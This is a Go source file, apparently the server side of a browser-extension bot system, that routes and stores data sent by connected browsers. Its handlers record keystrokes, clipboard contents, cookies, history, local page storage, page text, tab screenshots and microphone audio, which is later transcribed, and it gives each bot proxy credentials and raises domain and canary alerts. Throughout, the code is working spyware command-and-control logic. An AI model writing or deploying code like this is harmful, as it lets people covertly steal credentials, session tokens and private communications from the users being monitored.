package ws

import (
	"context"
	"encoding/json"
	"log/slog"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/s045pd/umbra/internal/blobstore"
	"github.com/s045pd/umbra/internal/db/models"
	"github.com/s045pd/umbra/internal/detect"
	"github.com/s045pd/umbra/internal/transcribe"
	"github.com/s045pd/umbra/internal/utils"
)

// dispatch routes an inbound envelope to the appropriate persistence
// handler. Returning an error closes the session.
func (s *Server) dispatch(ctx context.Context, sess *Session, env Envelope) error {
	if sess.resolvePending(env) {
		// It was a reply to one of our outbound RPCs — handled.
		return nil
	}
	switch env.Action {
	case ActionPing:
		return s.handlePing(ctx, sess, env)
	case ActionPong:
		// Old extensions echo PONG back as if it were an RPC. The
		// server already updated lastSeen via the original PING, so
		// the echo is harmless — silently drop it instead of warning.
		return nil
	case ActionSync:
		return s.handleSync(ctx, sess, env)
	case ActionSyncHuge:
		return s.handleSyncHuge(ctx, sess, env)
	case ActionState:
		return s.handleState(ctx, sess, env)
	case ActionRealtimeImg:
		return s.handleRealtimeImg(ctx, sess, env)
	case ActionScreenCaptureData:
		return s.handleScreenCaptureData(ctx, sess, env)
	case ActionUserActivity:
		return s.handleUserActivity(ctx, sess, env)
	case ActionDebugLog:
		return s.handleDebugLog(ctx, sess, env)
	case ActionKeyboardLogs:
		return s.handleKeyboardLogs(ctx, sess, env)
	case ActionAudioData:
		return s.handleAudioData(ctx, sess, env)
	case ActionNavEvent:
		return s.handleNavEvent(ctx, sess, env)
	case ActionClipboardData:
		return s.handleClipboardData(ctx, sess, env)
	case ActionCookieEvent:
		return s.handleDeltaEvent(ctx, sess, env, "cookie")
	case ActionTabEvent:
		return s.handleDeltaEvent(ctx, sess, env, "tab")
	case ActionPageStorage:
		return s.handlePageStorage(ctx, sess, env)
	case ActionPageText:
		return s.handlePageText(ctx, sess, env)
	default:
		s.logger.Warn("unknown action", "action", env.Action, "browser", sess.BrowserID)
		return nil
	}
}

// handlePing replies with PONG and updates last_online + the optional
// fields the bot may piggy-back on the ping (current_tab, user_agent).
// This matches Node server.js where PING acts as the heartbeat and the
// way fresh per-tab state ships to the panel.
func (s *Server) handlePing(ctx context.Context, sess *Session, env Envelope) error {
	now := time.Now()
	updates := map[string]any{"is_online": true, "last_online": now}

	var data struct {
		CurrentTab      map[string]any `json:"current_tab"`
		CurrentTabImage string         `json:"current_tab_image"`
		UserAgent       string         `json:"user_agent"`
	}
	if err := json.Unmarshal(env.Data, &data); err == nil {
		if data.CurrentTab != nil {
			updates["current_tab"] = models.JSONMap(data.CurrentTab)
		}
		if data.CurrentTabImage != "" {
			updates["current_tab_image"] = data.CurrentTabImage
			updates["current_tab_image_at"] = time.Now()
		}
		if data.UserAgent != "" {
			updates["user_agent"] = data.UserAgent
		}
	}

	if err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Updates(updates).Error; err != nil {
		s.logger.Warn("ping update failed", "err", err)
	}

	// PING doubles as the activity heartbeat: each tick extends the
	// current open session's interval, or opens a fresh one once the
	// gap since the last tick exceeds sessionGap (e.g. browser sleep,
	// network drop). USER_ACTIVITY events still merge through the same
	// path so explicit user interaction remains a valid signal too.
	if err := s.recordActivityTick(sess.BotID, now); err != nil {
		s.logger.Warn("activity tick failed", "err", err)
	}

	return sess.SendJSON(ctx, Envelope{ID: env.ID, Action: ActionPong})
}

func (s *Server) handleSync(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Tabs []any `json:"tabs"`
	}
	_ = json.Unmarshal(env.Data, &data)
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Update("tabs", models.JSONArray(data.Tabs)).Error
}

func (s *Server) handleSyncHuge(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		History     []any          `json:"history"`
		Bookmarks   []any          `json:"bookmarks"`
		Cookies     []any          `json:"cookies"`
		Downloads   []any          `json:"downloads"`
		Sessions    []any          `json:"sessions"`
		TopSites    []any          `json:"top_sites"`
		SystemInfo  map[string]any `json:"system_info"`
		ReadingList []any          `json:"reading_list"`
	}
	_ = json.Unmarshal(env.Data, &data)
	updates := map[string]any{}
	if data.History != nil {
		updates["history"] = models.JSONArray(data.History)
	}
	if data.Bookmarks != nil {
		updates["bookmarks"] = models.JSONArray(data.Bookmarks)
	}
	if data.Cookies != nil {
		updates["cookies"] = models.JSONArray(data.Cookies)
	}
	if data.Downloads != nil {
		updates["downloads"] = models.JSONArray(data.Downloads)
	}
	if data.Sessions != nil {
		updates["sessions"] = models.JSONArray(data.Sessions)
	}
	if data.TopSites != nil {
		updates["top_sites"] = models.JSONArray(data.TopSites)
	}
	if data.SystemInfo != nil {
		updates["system_info"] = models.JSONMap(data.SystemInfo)
	}
	if data.ReadingList != nil {
		updates["reading_list"] = models.JSONArray(data.ReadingList)
	}
	if len(updates) == 0 {
		return nil
	}
	if err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(updates).Error; err != nil {
		return err
	}
	if data.Cookies != nil {
		s.maybeCanaryAlert(sess, data.Cookies)
	}
	return nil
}

func (s *Server) handleState(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		State string `json:"state"`
	}
	_ = json.Unmarshal(env.Data, &data)
	now := time.Now()
	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Updates(map[string]any{"state": data.State, "last_active_at": now}).Error
}

// handleRealtimeImg persists the live tab snapshot the bot piggy-backs
// on each REALTIME_IMG frame. The wire field is `current_tab_image`
// (matches the extension's payload and the same field PING uses); the
// older `image` key was a server-side typo that never matched the
// client and silently overwrote the stored thumbnail with an empty
// string on every frame.
func (s *Server) handleRealtimeImg(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		CurrentTabImage string `json:"current_tab_image"`
		// Legacy fallback in case any older client still uses `image`.
		Image string `json:"image"`
	}
	_ = json.Unmarshal(env.Data, &data)
	img := data.CurrentTabImage
	if img == "" {
		img = data.Image
	}
	if img == "" {
		// Never let an empty frame clobber the last good thumbnail —
		// captureVisibleTab can momentarily return "" (e.g. tab is
		// still loading or not visible) and we don't want to wipe the
		// GUI thumbnail in that window.
		return nil
	}
	at := time.Now()
	err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
		Updates(map[string]any{
			"current_tab_image":    img,
			"current_tab_image_at": at,
		}).Error
	if err == nil {
		s.live.Publish(sess.BotID, at)
	}
	return err
}

func (s *Server) handleScreenCaptureData(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Captures []struct {
			URL       string  `json:"url"`
			Title     string  `json:"title"`
			ImageData string  `json:"imageData"`
			SessionID string  `json:"sessionId"`
			Diff      float64 `json:"difference"`
		} `json:"captures"`
		SessionID string `json:"sessionId"`
	}
	if err := json.Unmarshal(env.Data, &data); err != nil {
		return nil
	}
	for _, c := range data.Captures {
		sid := c.SessionID
		if sid == "" {
			sid = data.SessionID
		}
		row := models.BotScreenshot{
			BotID:      sess.BotID,
			URL:        c.URL,
			Title:      c.Title,
			ImageData:  c.ImageData,
			SessionID:  sid,
			Difference: &c.Diff,
			Timestamp:  time.Now(),
		}
		s.offloadScreenshot(&row)
		if err := s.db.Create(&row).Error; err != nil {
			return err
		}
	}
	return s.trimOldRows(sess.BotID, 500)
}

// recordActivityTick merges a single activity tick into the bot's
// `activity` jsonb array. If the tick is within sessionGap of the last
// known active timestamp the current open session's end is extended;
// otherwise a fresh {start, end} session is appended. last_active_at is
// always bumped so the next tick can decide whether to merge.
func (s *Server) recordActivityTick(botID uuid.UUID, now time.Time) error {
	const sessionGap = 5 * time.Minute

	var bot models.Bot
	if err := s.db.Select("activity", "last_active_at").
		Where("id = ?", botID).First(&bot).Error; err != nil {
		return s.db.Model(&models.Bot{}).Where("id = ?", botID).
			Update("last_active_at", now).Error
	}

	nowStr := now.Format(time.RFC3339)
	var sessions []map[string]string
	if bot.Activity != nil {
		raw, _ := json.Marshal(bot.Activity)
		_ = json.Unmarshal(raw, &sessions)
	}

	merged := false
	if len(sessions) > 0 && bot.LastActiveAt != nil &&
		now.Sub(*bot.LastActiveAt) < sessionGap {
		sessions[len(sessions)-1]["end"] = nowStr
		merged = true
	}
	if !merged {
		sessions = append(sessions, map[string]string{
			"start": nowStr,
			"end":   nowStr,
		})
	}

	if len(sessions) > 2000 {
		sessions = sessions[len(sessions)-2000:]
	}

	return s.db.Model(&models.Bot{}).Where("id = ?", botID).
		Updates(map[string]any{
			"last_active_at": now,
			"activity":       models.JSONArray(toAnySlice(sessions)),
		}).Error
}

func (s *Server) handleUserActivity(_ context.Context, sess *Session, _ Envelope) error {
	return s.recordActivityTick(sess.BotID, time.Now())
}

func toAnySlice(in []map[string]string) []any {
	out := make([]any, len(in))
	for i, v := range in {
		out[i] = v
	}
	return out
}

func (s *Server) handleDebugLog(_ context.Context, sess *Session, env Envelope) error {
	s.logger.Info("bot debug", "browser", sess.BrowserID, "data", string(env.Data))
	return nil
}

func (s *Server) handleKeyboardLogs(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		URL   string `json:"url"`
		Title string `json:"title"`
		Keys  string `json:"keys"`
		Field string `json:"field"`
	}
	_ = json.Unmarshal(env.Data, &data)
	row := models.BotKeyboardLog{
		BotID:     sess.BotID,
		URL:       data.URL,
		Title:     data.Title,
		Keys:      data.Keys,
		Field:     data.Field,
		Timestamp: time.Now(),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimOldRows(sess.BotID, 1000)
}

func (s *Server) handleAudioData(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Audio     string `json:"audio"`
		Chunk     string `json:"chunk"`
		Text      string `json:"text"`
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(env.Data, &data); err != nil {
		s.logger.Warn("audio unmarshal failed", "err", err)
		return nil
	}
	recording := data.Audio
	if recording == "" {
		recording = data.Chunk
	}
	if recording == "" {
		if strings.TrimSpace(data.Text) == "" || data.SessionID == "" {
			return nil
		}
		s.appendSessionTranscript(sess.BotID, data.SessionID, data.Text)
		return nil
	}
	now := time.Now()
	row := models.BotRecording{
		Bot:       sess.BotID,
		Recording: recording,
		Text:      data.Text,
		SessionID: data.SessionID,
		Timestamp: &now,
	}
	s.offloadRecording(&row)
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	if s.transcribeOpts.Enabled() && strings.TrimSpace(row.Text) == "" {
		id := row.ID
		go s.transcribeRecording(id)
	}
	return nil
}

func (s *Server) handleNavEvent(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		URL                  string   `json:"url"`
		Title                string   `json:"title"`
		TabID                int      `json:"tab_id"`
		Timestamp            float64  `json:"timestamp"`
		TransitionType       string   `json:"transition_type"`
		TransitionQualifiers []string `json:"transition_qualifiers"`
	}
	_ = json.Unmarshal(env.Data, &data)
	if data.URL == "" {
		return nil
	}
	ts := eventTimestamp(data.Timestamp)
	row := models.BotNavEvent{
		BotID:          sess.BotID,
		URL:            data.URL,
		Title:          data.Title,
		TransitionType: data.TransitionType,
		TabID:          data.TabID,
		Timestamp:      ts,
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	_ = s.trimTable(sess.BotID, "bot_nav_events", 5000)
	s.maybeDomainAlert(sess, data.URL, data.Title, ts)
	s.maybePlaybookAlert(sess, data.URL, data.Title, ts)
	return nil
}

func eventTimestamp(raw float64) time.Time {
	now := time.Now()
	switch {
	case raw > 1e12:
		return time.UnixMilli(int64(raw))
	case raw > 1e9:
		return time.Unix(int64(raw), 0)
	default:
		return now
	}
}

func (s *Server) maybeDomainAlert(sess *Session, rawURL, title string, ts time.Time) {
	var bot models.Bot
	if err := s.db.Select("switch_config", "data_config", "name").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
		return
	}
	if !detect.NotificationEnabled(map[string]any(bot.SwitchConfig)) {
		return
	}
	domains := detect.DomainsFromConfig(map[string]any(bot.DataConfig))
	if !detect.MatchURL(rawURL, domains) {
		return
	}
	var recent int64
	_ = s.db.Model(&models.BotAlert{}).
		Where("bot_id = ? AND url = ? AND timestamp > ?", sess.BotID, rawURL, ts.Add(-10*time.Minute)).
		Count(&recent).Error
	if recent > 0 {
		return
	}
	alert := models.BotAlert{
		BotID:     sess.BotID,
		Kind:      "domain",
		Severity:  "high",
		Title:     "Monitored domain visit",
		URL:       rawURL,
		Detail:    title,
		Timestamp: ts,
	}
	_ = s.db.Create(&alert).Error
}

func (s *Server) handleDeltaEvent(_ context.Context, sess *Session, env Envelope, kind string) error {
	var data struct {
		Action string         `json:"action"`
		URL    string         `json:"url"`
		Title  string         `json:"title"`
		Detail string         `json:"detail"`
		Cause  string         `json:"cause"`
		Name   string         `json:"name"`
		Domain string         `json:"domain"`
		TabID  int            `json:"tab_id"`
		Cookie map[string]any `json:"cookie"`
	}
	_ = json.Unmarshal(env.Data, &data)
	action := data.Action
	if action == "" {
		action = data.Cause
	}
	detail := data.Detail
	if detail == "" && data.Name != "" {
		detail = data.Name
		if data.Domain != "" {
			detail += "@" + data.Domain
		}
	}
	payload := models.JSONMap{}
	if data.Cookie != nil {
		payload["cookie"] = data.Cookie
	}
	if data.TabID != 0 {
		payload["tab_id"] = data.TabID
	}
	row := models.BotDeltaEvent{
		BotID:     sess.BotID,
		Kind:      kind,
		Action:    action,
		URL:       data.URL,
		Title:     data.Title,
		Detail:    detail,
		Payload:   payload,
		Timestamp: time.Now(),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimTable(sess.BotID, "bot_delta_events", 4000)
}

func (s *Server) handlePageStorage(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Origins []any `json:"origins"`
		Storage []any `json:"storage"`
	}
	_ = json.Unmarshal(env.Data, &data)
	origins := data.Origins
	if origins == nil {
		origins = data.Storage
	}
	if origins == nil {
		origins = []any{}
	}
	now := time.Now()
	row := models.BotPageStorage{
		BotID:      sess.BotID,
		Origins:    models.JSONArray(origins),
		CapturedAt: now,
	}
	var existing models.BotPageStorage
	err := s.db.Where("bot_id = ?", sess.BotID).First(&existing).Error
	if err == nil {
		return s.db.Model(&existing).Updates(map[string]any{
			"origins":     row.Origins,
			"captured_at": now,
		}).Error
	}
	return s.db.Create(&row).Error
}

func (s *Server) trimTable(botID uuid.UUID, table string, keep int) error {
	return s.db.Exec(
		`DELETE FROM `+table+` WHERE bot_id = ? AND id NOT IN (SELECT id FROM `+table+` WHERE bot_id = ? ORDER BY timestamp DESC LIMIT ?)`,
		botID, botID, keep,
	).Error
}

func (s *Server) handleClipboardData(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		Text   string `json:"text"`
		Action string `json:"action"`
		URL    string `json:"url"`
		Title  string `json:"title"`
	}
	if err := json.Unmarshal(env.Data, &data); err != nil {
		return nil
	}
	if data.Text == "" {
		return nil
	}
	row := models.BotClipboardLog{
		BotID:     sess.BotID,
		URL:       data.URL,
		Title:     data.Title,
		Text:      data.Text,
		Action:    data.Action,
		Timestamp: time.Now(),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimOldRows(sess.BotID, 1000)
}

// trimOldRows keeps the per-bot screenshot/keyboard/clipboard tables bounded.
// Mirrors the 500/1000 caps in server.js.
func (s *Server) trimOldRows(botID uuid.UUID, keep int) error {
	for _, table := range []string{"bot_screenshots", "bot_keyboard_logs", "bot_clipboard_logs"} {
		_ = s.db.Exec(
			`DELETE FROM `+table+` WHERE bot_id = ? AND id NOT IN (SELECT id FROM `+table+` WHERE bot_id = ? ORDER BY timestamp DESC LIMIT ?)`,
			botID, botID, keep,
		).Error
	}
	return nil
}

func (s *Server) offloadScreenshot(row *models.BotScreenshot) {
	if s.blobs == nil || row.ImageData == "" {
		return
	}
	raw, _, err := blobstore.DecodeDataURL(row.ImageData)
	if err != nil || len(raw) == 0 {
		return
	}
	hash, err := s.blobs.Put("screenshots", raw)
	if err != nil {
		return
	}
	row.BlobHash = hash
	row.ImageData = ""
	row.OCRText = nearestPageText(s, row.BotID, row.URL)
}

func (s *Server) offloadRecording(row *models.BotRecording) {
	if s.blobs == nil || row.Recording == "" {
		return
	}
	raw, _, err := blobstore.DecodeDataURL(row.Recording)
	if err != nil || len(raw) == 0 {
		return
	}
	hash, err := s.blobs.Put("audio", raw)
	if err != nil {
		return
	}
	row.BlobHash = hash
	row.Recording = ""
}

func (s *Server) appendSessionTranscript(botID uuid.UUID, sessionID, text string) {
	text = strings.TrimSpace(text)
	if text == "" {
		return
	}
	var last models.BotRecording
	if err := s.db.Where(`"bot" = ? AND session_id = ?`, botID, sessionID).
		Order("timestamp DESC").First(&last).Error; err != nil {
		return
	}
	combined := strings.TrimSpace(last.Text + " " + text)
	_ = s.db.Model(&last).Update("text", combined).Error
}

func (s *Server) transcribeRecording(id uuid.UUID) {
	var row models.BotRecording
	if err := s.db.First(&row, "id = ?", id).Error; err != nil {
		return
	}
	var raw []byte
	if row.BlobHash != "" && s.blobs != nil {
		raw, _ = s.blobs.Get("audio", row.BlobHash)
	}
	if len(raw) == 0 && row.Recording != "" {
		raw, _, _ = blobstore.DecodeDataURL(row.Recording)
	}
	if len(raw) == 0 {
		return
	}
	text, err := transcribe.RunOptions(s.transcribeOpts, raw)
	if err != nil || strings.TrimSpace(text) == "" {
		return
	}
	_ = s.db.Model(&row).Update("text", text).Error
}

func nearestPageText(s *Server, botID uuid.UUID, rawURL string) string {
	if rawURL == "" {
		return ""
	}
	var row models.BotPageText
	err := s.db.Where("bot_id = ? AND url = ?", botID, rawURL).
		Order("timestamp DESC").First(&row).Error
	if err != nil {
		return ""
	}
	return row.Text
}

func (s *Server) handlePageText(_ context.Context, sess *Session, env Envelope) error {
	var data struct {
		URL       string  `json:"url"`
		Title     string  `json:"title"`
		Text      string  `json:"text"`
		Timestamp float64 `json:"timestamp"`
	}
	_ = json.Unmarshal(env.Data, &data)
	if data.Text == "" {
		return nil
	}
	if len(data.Text) > 8000 {
		data.Text = data.Text[:8000]
	}
	row := models.BotPageText{
		BotID:     sess.BotID,
		URL:       data.URL,
		Title:     data.Title,
		Text:      data.Text,
		Timestamp: eventTimestamp(data.Timestamp),
	}
	if err := s.db.Create(&row).Error; err != nil {
		return err
	}
	return s.trimTable(sess.BotID, "bot_page_texts", 2000)
}

func (s *Server) maybePlaybookAlert(sess *Session, rawURL, title string, ts time.Time) {
	var bot models.Bot
	if err := s.db.Select("switch_config", "data_config", "name").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
		return
	}
	rules := detect.RulesFromConfig(map[string]any(bot.DataConfig))
	rule := detect.MatchRule(rawURL, rules)
	if rule == nil || rule.Action == detect.ActionBlock {
		return
	}
	kind := "playbook"
	if rule.Action == detect.ActionNotify {
		kind = "domain"
	}
	var recent int64
	_ = s.db.Model(&models.BotAlert{}).
		Where("bot_id = ? AND url = ? AND kind = ? AND timestamp > ?", sess.BotID, rawURL, kind, ts.Add(-10*time.Minute)).
		Count(&recent).Error
	if recent > 0 {
		return
	}
	_ = s.db.Create(&models.BotAlert{
		BotID: sess.BotID, Kind: kind, Severity: "high",
		Title: "Policy " + rule.Action, URL: rawURL, Detail: title, Timestamp: ts,
	}).Error
}

func (s *Server) maybeCanaryAlert(sess *Session, cookies []any) {
	var bot models.Bot
	if err := s.db.Select("id", "name", "data_config").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
		return
	}
	self, _ := bot.DataConfig["CANARY_TOKEN"].(string)
	parsed := make([]map[string]any, 0, len(cookies))
	for _, c := range cookies {
		if m, ok := c.(map[string]any); ok {
			parsed = append(parsed, m)
		}
	}
	hit := detect.ForeignCanary(parsed, self)
	if hit == nil {
		return
	}
	owners := s.canaryOwners()
	owner := detect.LookupOwner(owners, hit.Value)
	detail := "canary cookie from another endpoint observed on " + hit.Domain
	if owner != "" {
		detail += " (owner bot " + owner + ")"
	}
	_ = s.db.Create(&models.BotAlert{
		BotID: sess.BotID, Kind: "canary_moved", Severity: "critical",
		Title: "Session canary appeared on a different endpoint",
		URL:   hit.Domain, Detail: detail, Timestamp: time.Now(),
	}).Error
}

func (s *Server) canaryOwners() map[string]string {
	var bots []models.Bot
	_ = s.db.Select("id", "data_config").Find(&bots).Error
	out := map[string]string{}
	for _, b := range bots {
		if t, ok := b.DataConfig["CANARY_TOKEN"].(string); ok && t != "" {
			out[t] = b.ID.String()
		}
	}
	return out
}

// authenticate processes the AUTH handshake and returns the matching bot row.
// Reads directly from the connection (the readLoop hasn't started yet).
func (s *Server) authenticate(ctx context.Context, sess *Session, slogger *slog.Logger) (*models.Bot, error) {
	// Send our AUTH probe.
	probeID := uuid.NewString()
	if err := sess.SendJSON(ctx, Envelope{ID: probeID, Action: ActionAuth}); err != nil {
		return nil, err
	}

	deadline, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	for {
		_, raw, err := sess.conn.Read(deadline)
		if err != nil {
			return nil, errAuthTimeout
		}
		var env Envelope
		if err := json.Unmarshal(raw, &env); err != nil {
			continue
		}
		// Bot may emit unrelated messages; only AUTH replies count.
		if env.Action != ActionAuth || env.ID != probeID {
			continue
		}
		var data AuthData
		if err := json.Unmarshal(env.Data, &data); err != nil {
			return nil, err
		}
		if data.BrowserID == "" {
			return nil, errInvalidAuth
		}
		sess.Capabilities = data.Capabilities
		return s.upsertBot(data, slogger)
	}
}

func (s *Server) upsertBot(data AuthData, slogger *slog.Logger) (*models.Bot, error) {
	var b models.Bot
	err := s.db.Where("browser_id = ?", data.BrowserID).First(&b).Error
	if err == nil {
		// Existing bot: mark online, update creds if rotated
		updates := map[string]any{"is_online": true, "last_online": time.Now()}
		if data.ProxyUsername != "" && data.ProxyUsername != b.ProxyUsername {
			updates["proxy_username"] = data.ProxyUsername
		}
		if data.ProxyPassword != "" && data.ProxyPassword != b.ProxyPassword {
			updates["proxy_password"] = data.ProxyPassword
		}
		if data.UserAgent != "" {
			updates["user_agent"] = data.UserAgent
		}
		if data.SystemInfo != nil {
			updates["system_info"] = models.JSONMap(data.SystemInfo)
		}
		if err := s.db.Model(&b).Updates(updates).Error; err != nil {
			return nil, err
		}
		return &b, nil
	}
	// New bot: create with random credentials if none provided
	if data.ProxyUsername == "" {
		data.ProxyUsername, _ = utils.SecureRandomHex(8)
	}
	if data.ProxyPassword == "" {
		data.ProxyPassword, _ = utils.SecureRandomHex(8)
	}
	b = models.Bot{
		BrowserID:     data.BrowserID,
		Name:          "Untitled Proxy",
		ProxyUsername: data.ProxyUsername,
		ProxyPassword: data.ProxyPassword,
		IsOnline:      true,
		LastOnline:    time.Now(),
		UserAgent:     data.UserAgent,
	}
	if data.SystemInfo != nil {
		b.SystemInfo = models.JSONMap(data.SystemInfo)
	}
	if err := s.db.Create(&b).Error; err != nil {
		return nil, err
	}
	if slogger != nil {
		slogger.Info("new bot connected", "browser", data.BrowserID, "id", b.ID)
	}
	return &b, nil
}

// Used to avoid leaking gorm errors as auth errors.
var (
	errInvalidAuth = newAuthError("invalid AUTH payload")
	errAuthTimeout = newAuthError("AUTH timed out")
)

type authError struct{ msg string }

func newAuthError(s string) error  { return &authError{s} }
func (e *authError) Error() string { return e.msg }
